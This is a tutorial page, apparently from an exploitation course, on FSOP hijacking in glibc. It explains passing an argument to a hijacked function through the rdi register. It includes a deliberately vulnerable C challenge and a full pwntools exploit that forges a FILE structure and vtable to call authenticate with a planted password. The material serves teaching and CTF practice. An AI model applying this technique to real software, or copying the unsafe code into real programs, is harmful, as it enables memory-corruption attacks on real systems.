#metadata(
  (
    title: "Hijacking with Argument",
    description: "Advanced FSOP hijacking: passing arguments to functions by leveraging register states during the vtable dispatch.",
    date: "2026-01-02",
    order: 8,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Hijacking with Arguments

In basic FSOP hijacking, we redirect execution to a function like `win()` that requires no arguments. However, we can often control the arguments passed to the hijacked function by leveraging the state of registers at the time of the call.

In the `_IO_wfile_jumps` bypass, when the program eventually calls our target function (via `_IO_wdoallocbuf`), the first argument (`rdi`) is still the pointer to the `FILE` structure (`fp`).

#quote(attribution: [Fun Fact])[
  During the entire chain from `fwrite` down to `_IO_wdoallocbuf`, the `rdi` register remains populated with the address of the `FILE` structure. This means the hijacked function will receive the corrupted `FILE` struct as its first argument.
]

== Vulnerable Scenario

This challenge requires us to call `authenticate(char *pw)` with the correct password. Since `rdi` will point to the start of our corrupted `FILE` struct, we can simply place the password string at the very beginning of the structure (the `_flags` field).

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

FILE *fp;
char *buf;

void authenticate(char *pw) {
  if (strcmp(pw, "password") == 0) {
    puts("Well done baby");
    return;
  } else {
    puts("You are not 1337 enough.");
    exit(1);
  }
}

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("libc leak: %p\n", puts);

  buf = malloc(0x100);
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "r");

  printf("file pointer leak: %p\n", fp);

  // Overflow into the FILE structure
  read(0, fp, 0x1e0);

  // This will call authenticate(fp)
  fwrite(buf, 1, 0x100, fp);

  return 0;
}
```

== Exploit Strategy

1. **Password Placement**: We place the string `"password\0"` at offset `0x00` of the `FILE` structure. This overwrites the `_flags` field but satisfies the `strcmp` in `authenticate`.
2. **Overlap**: We use the same self-overlapping technique from the previous module to save space.
3. **The Dispatch**: When `_IO_wdoallocbuf` calls the function at our fake `_wide_vtable + 0x68`, it executes `authenticate(fp)`. Because `fp` starts with `"password"`, the check passes.

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")
p = process(elf.path)
libc = elf.libc

# 1. Parse leaks
p.recvuntil(b"libc leak: ")
libc.address = int(p.recvline().strip(), 16) - libc.sym.puts
info(f"Libc base: {hex(libc.address)}")

p.recvuntil(b"file pointer leak: ")
fp_addr = int(p.recvline().strip(), 16)
info(f"FILE pointer (fp): {hex(fp_addr)}")

# 2. Construct payload
payload = flat(
    {
        0x00: b"password\0",                    # Overwrite _flags with password
        0x68: elf.sym.authenticate,             # _chain -> target function
        0x88: fp_addr - 0x10,                   # _lock -> writable memory
        0xA0: fp_addr,                          # _wide_data -> points to self
        0xD8: libc.sym._IO_wfile_jumps - 0x20,  # vtable -> targets _IO_wfile_overflow
    },
    filler=b"\x00",
)

# 3. Setup _wide_vtable at offset 0xE0
payload = payload.ljust(0xE0, b"\x00")
payload += p64(fp_addr)                         # _wide_vtable -> points to self

p.sendline(payload)

p.interactive()
```
